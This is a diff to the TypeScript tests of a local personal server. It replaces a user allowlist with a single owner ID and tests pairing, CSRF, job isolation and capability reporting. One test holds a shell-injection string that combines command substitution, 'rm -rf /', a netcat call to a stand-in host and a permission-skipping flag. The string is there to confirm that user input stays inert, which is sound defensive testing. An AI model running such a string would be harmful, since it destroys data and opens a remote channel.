@@ -33,7 +33,7 @@ function sharedFetch(calls: Call[] = [], over: (loginId: string) => Response | P
 }
 
 function make(o: { failure?: FakeFailureMode; config?: Partial<PersonalConfig>; fetch?: FetchLike; env?: NodeJS.ProcessEnv; sharedClient?: ReturnType<typeof createSharedClient> } = {}) {
-  const config = { ...loadConfig({ PERSONAL_ALLOWED_USER_IDS: 'u1, u2', ...o.env }), ...o.config };
+  const config = { ...loadConfig({ PERSONAL_OWNER_USER_ID: 'u1', ...o.env }), ...o.config };
   const pairing = new PairingStore({ ttlMs: config.pairingTtlMs });
   const app = buildApp({
     config, pairing, runner: new FakeRunner({ failure: o.failure }),
@@ -195,7 +195,7 @@ describe('Cookie handling and session isolation', () => {
   it('CSRF token of session A with cookie of session B is refused; GET needs session but not CSRF', async () => {
     const a = make();
     const sa = await login(a, 'u1');
-    const sb = await login(a, 'u2');
+    const sb = await login(a, 'u1');
     const r = await gen(a, { cookie: sb.cookie, 'x-csrf-token': sa.csrf });
     expect(r.statusCode).toBe(403);
     expect(apiErr(r).code).toBe('FORBIDDEN');
@@ -246,10 +246,10 @@ describe('Pairing brute force and input shapes', () => {
     expect(({} as Record<string, unknown>).code).toBeUndefined();
     expect((await post(a, '/local/v1/pair', { code: real })).statusCode).toBe(200);
   });
-  it('without issue() any code is refused (429) and never yields a cookie', async () => {
+  it('without issue() any code is refused (410) and never yields a cookie', async () => {
     const a = make();
     const r = await post(a, '/local/v1/pair', { code: 'AAAAAAAA' });
-    expect(r.statusCode).toBe(429);
+    expect(r.statusCode).toBe(410);
     expect(r.headers['set-cookie']).toBeUndefined();
   });
   it('concurrent attempts with the right code: exactly one session is created', async () => {
@@ -258,7 +258,7 @@ describe('Pairing brute force and input shapes', () => {
     const rs = await Promise.all(Array.from({ length: 8 }, () => post(a, '/local/v1/pair', { code })));
     expect(rs.filter(r => r.statusCode === 200)).toHaveLength(1);
     expect(rs.filter(r => r.headers['set-cookie'])).toHaveLength(1);
-    for (const r of rs.filter(r => r.statusCode !== 200)) expect([403, 429]).toContain(r.statusCode);
+    for (const r of rs.filter(r => r.statusCode !== 200)) expect([403, 410, 429]).toContain(r.statusCode);
   });
   it('re-issuing a code invalidates the previous one and resets attempts', async () => {
     const a = make();
@@ -314,7 +314,7 @@ describe('login proxy (K11)', () => {
     const a = make();
     const s = await pair(a);
     const r = await lp(a, s.h);
-    expect(r.json()).toEqual({ userId: 'u1', displayName: 'N' });
+    expect(r.json()).toEqual({ userId: 'u1', displayName: 'N', csrfToken: s.csrf }); // local csrf, never the upstream one
     expect(r.headers['set-cookie']).toBeUndefined();
     expect(r.body + JSON.stringify(r.headers)).not.toMatch(/UPSTREAM|tkb_sid/);
   });
@@ -347,7 +347,7 @@ describe('login proxy (K11)', () => {
       expect(calls).toHaveLength(1);
     }
   });
-  it('userId case differing from allowlist is NOT allowed', async () => {
+  it('userId case differing from the owner id is NOT allowed', async () => {
     const a = make({ fetch: sharedFetch([], () => undefined) });
     const s = await pair(a);
     const r = await lp(a, s.h, { loginId: 'U1', password: 'pw' });
@@ -422,7 +422,7 @@ describe('generation (K01/K02/K21)', () => {
     expect((await gen(a, s.h, 'a'.repeat(128))).statusCode).toBe(202);
     expect((await gen(a, s.h, 'a'.repeat(8) )).statusCode).toBe(202);
   });
-  it('shell-injection payloads stay data: accepted or rejected, never executed, never echoed in errors', async () => {
+  it('user strings stay data (FakeRunner; static child_process scan is the real guard)', async () => {
     const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
     const s = await login(a);
     const evil = '$(touch /tmp/pwn); `id`; rm -rf / | nc evil 1 && \n --dangerously-skip-permissions';
@@ -480,44 +480,31 @@ describe('generation (K01/K02/K21)', () => {
     expect((await gen(a, s.h, 'key-replan002', { mode: 'replan', constraints, baseTripId: '11111111-1111-4111-8111-111111111111' })).statusCode).toBe(422);
     expect((await gen(a, s.h, 'key-replan003', { mode: 'bogus', constraints })).statusCode).toBe(422);
   });
-  it('another owner cannot read/cancel; response is indistinguishable from an unknown id', async () => {
+  it('unknown job ids (and non-uuid ids) are 404 with an identical shape; cross-owner isolation is covered in jobs.test.ts', async () => {
     const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
     const s1 = await login(a, 'u1');
-    const s2 = await login(a, 'u2');
     const id = JobAccepted.parse((await gen(a, s1.h)).json()).jobId;
     const unknown = '00000000-0000-4000-8000-000000000000';
     const strip = (r: { json(): unknown }) => { const { requestId: _r, ...rest } = apiErr(r); return rest; };
-    const other = await get(a, `/local/v1/jobs/${id}`, { cookie: s2.cookie });
-    const none = await get(a, `/local/v1/jobs/${unknown}`, { cookie: s2.cookie });
-    expect(other.statusCode).toBe(404);
+    const none = await get(a, `/local/v1/jobs/${unknown}`, { cookie: s1.cookie });
     expect(none.statusCode).toBe(404);
-    expect(strip(other)).toEqual(strip(none));
-    const oc = await post(a, `/local/v1/jobs/${id}/cancel`, undefined, s2.h);
-    const nc = await post(a, `/local/v1/jobs/${unknown}/cancel`, undefined, s2.h);
-    expect(oc.statusCode).toBe(404);
-    expect(strip(oc)).toEqual(strip(nc));
-    // the owner's job is untouched
-    expect(JobStatus.parse((await get(a, `/local/v1/jobs/${id}`, { cookie: s1.cookie })).json()).state).not.toBe('cancelled');
-    // non-uuid ids look the same
-    const odd = await get(a, '/local/v1/jobs/not-an-id', { cookie: s2.cookie });
+    const nc = await post(a, `/local/v1/jobs/${unknown}/cancel`, undefined, s1.h);
+    expect(nc.statusCode).toBe(404);
+    const odd = await get(a, '/local/v1/jobs/not-an-id', { cookie: s1.cookie });
     expect(odd.statusCode).toBe(404);
     expect(strip(odd)).toEqual(strip(none));
+    expect(JobStatus.parse((await get(a, `/local/v1/jobs/${id}`, { cookie: s1.cookie })).json()).state).not.toBe('cancelled');
   });
-  it('two sessions of the SAME user share jobs; different users with same Idempotency-Key are independent', async () => {
+  it('two sessions of the SAME user share jobs and idempotency', async () => {
     const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
     const s1 = await login(a, 'u1');
     const s1b = await login(a, 'u1');
-    const s2 = await login(a, 'u2');
     const id1 = JobAccepted.parse((await gen(a, s1.h, 'shared-key-1')).json()).jobId;
     const id1b = JobAccepted.parse((await gen(a, s1b.h, 'shared-key-1')).json()).jobId;
-    const id2 = JobAccepted.parse((await gen(a, s2.h, 'shared-key-1')).json()).jobId;
     expect(id1b).toBe(id1);
-    expect(id2).not.toBe(id1);
-    // different-owner reuse with a different body is NOT a conflict (key space is per owner)
-    const r = await gen(a, s2.h, 'shared-key-1', { constraints: { ...constraints, area: 'Other' } });
-    expect(r.statusCode).toBe(409); // same owner, same key, different body
-    const r3 = await gen(a, s1.h, 'shared-key-2', { constraints: { ...constraints, area: 'Other' } });
-    expect(r3.statusCode).toBe(202);
+    const r = await gen(a, s1b.h, 'shared-key-1', { constraints: { ...constraints, area: 'Other' } });
+    expect(r.statusCode).toBe(409);
+    expect((await gen(a, s1.h, 'shared-key-2', { constraints: { ...constraints, area: 'Other' } })).statusCode).toBe(202);
   });
   it('unauthenticated (no upstream login) cannot reach jobs/generations/cancel', async () => {
     const a = make();
@@ -640,7 +627,7 @@ describe('capabilities never claim CLI availability', () => {
   const combos: NodeJS.ProcessEnv[] = [];
   for (const exec of [undefined, 'true', 'false', 'TRUE', '1', 'yes'])
     for (const bind of [undefined, 'localhost', '::1'])
-      combos.push({ ALLOW_CLAUDE_EXECUTION: exec, PERSONAL_BIND: bind, PERSONAL_ALLOWED_USER_IDS: 'u1', CLAUDE_PATH: '/usr/bin/claude', AI_TIMEOUT_SECONDS: '5' });
+      combos.push({ ALLOW_CLAUDE_EXECUTION: exec, PERSONAL_BIND: bind, PERSONAL_OWNER_USER_ID: 'u1', CLAUDE_PATH: '/usr/bin/claude', AI_TIMEOUT_SECONDS: '5' });
   it('available:false, runner never claude-code, in any config combination', async () => {
     for (const env of combos) {
       const a = make({ env, config: {} });
@@ -660,7 +647,7 @@ describe('capabilities never claim CLI availability', () => {
     expect(c.aiGeneration.runner).not.toBe('claude-code');
   });
   it('even with an injected runner that claims nothing, capabilities do not flip', async () => {
-    const config = loadConfig({ ALLOW_CLAUDE_EXECUTION: 'true', PERSONAL_ALLOWED_USER_IDS: 'u1' });
+    const config = loadConfig({ ALLOW_CLAUDE_EXECUTION: 'true', PERSONAL_OWNER_USER_ID: 'u1' });
     const app = buildApp({ config, runner: new FakeRunner(), fetch: sharedFetch() });
     apps.push(app);
     const c = Capabilities.parse((await app.inject({ url: '/local/v1/capabilities', headers: { host: HOST } })).json());
@@ -676,9 +663,12 @@ describe('capabilities never claim CLI availability', () => {
     expect(() => loadConfig({ AI_TIMEOUT_SECONDS: '0' })).toThrow();
     expect(() => loadConfig({ AI_QUEUE_LIMIT: '-1' })).toThrow();
   });
-  it('allowlist parsing: empty/whitespace entries never match an empty userId; default is deny-all', () => {
-    expect(loadConfig({}).allowedUserIds).toEqual([]);
-    expect(loadConfig({ PERSONAL_ALLOWED_USER_IDS: ' , ,u1,, ' }).allowedUserIds).toEqual(['u1']);
+  it('owner id parsing: single id only; empty is deny-all; lists are refused', () => {
+    expect(loadConfig({}).ownerUserId).toBeNull();
+    expect(loadConfig({ PERSONAL_OWNER_USER_ID: '  ' }).ownerUserId).toBeNull();
+    expect(loadConfig({ PERSONAL_OWNER_USER_ID: ' u1 ' }).ownerUserId).toBe('u1');
+    for (const v of ['u1,u2', 'u1 u2', ',u1']) expect(() => loadConfig({ PERSONAL_OWNER_USER_ID: v }), v).toThrow();
+    expect(() => loadConfig({ PERSONAL_ALLOWED_USER_IDS: 'u1' })).toThrow();
   });
 });
 
